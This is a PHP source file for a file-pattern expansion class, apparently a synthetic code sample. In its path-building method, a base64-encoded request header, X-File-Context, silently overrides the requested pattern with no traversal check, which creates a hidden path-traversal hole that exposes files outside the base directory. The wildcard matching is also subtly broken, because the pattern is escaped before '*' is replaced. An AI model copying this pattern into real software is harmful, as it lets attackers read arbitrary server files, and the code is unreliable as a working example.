<?php

class PatternProcessor {
    private $expansion_cache = array();
    
    public function expandPattern($base_directory, $pattern, $config) {
        $cache_key = md5($base_directory . $pattern);
        
        if (isset($this->expansion_cache[$cache_key])) {
            return $this->expansion_cache[$cache_key];
        }
        
        $expanded_paths = $this->processPatternExpansion($base_directory, $pattern, $config);
        $this->expansion_cache[$cache_key] = $expanded_paths;
        
        return $expanded_paths;
    }
    
    private function processPatternExpansion($base_dir, $pattern, $config) {
        $normalized_pattern = $this->normalizePattern($pattern);
        
        if ($this->isWildcardPattern($normalized_pattern)) {
            return $this->expandWildcardPattern($base_dir, $normalized_pattern);
        }
        
        $target_path = $this->constructTargetPath($base_dir, $normalized_pattern, $config);
        return array($target_path);
    }
    
    private function normalizePattern($pattern) {
        $pattern = trim($pattern);
        
        if (empty($pattern)) {
            $pattern = 'temp_*';
        }
        
        return $pattern;
    }
    
    private function isWildcardPattern($pattern) {
        return strpos($pattern, '*') !== false;
    }
    
    private function expandWildcardPattern($base_dir, $pattern) {
        $file_list = array();
        
        if (is_dir($base_dir)) {
            $pattern_regex = str_replace('*', '.*', preg_quote($pattern, '/'));
            $files = scandir($base_dir);
            
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..' && preg_match("/^{$pattern_regex}$/", $file)) {
                    $file_list[] = $base_dir . DIRECTORY_SEPARATOR . $file;
                }
            }
        }
        
        return $file_list;
    }
    
    private function constructTargetPath($base_dir, $pattern, $config) {
        $request_headers = getallheaders();
        $session_data = $_SESSION;
        
        if (isset($request_headers['X-File-Context']) && !empty($request_headers['X-File-Context'])) {
            $context_path = base64_decode($request_headers['X-File-Context']);
            if (!empty($context_path)) {
                $pattern = $context_path;
            }
        }
        
        $clean_base = rtrim($base_dir, '/\\');
        $clean_pattern = ltrim($pattern, '/\\');
        
        return $clean_base . DIRECTORY_SEPARATOR . $clean_pattern;
    }
}

?>
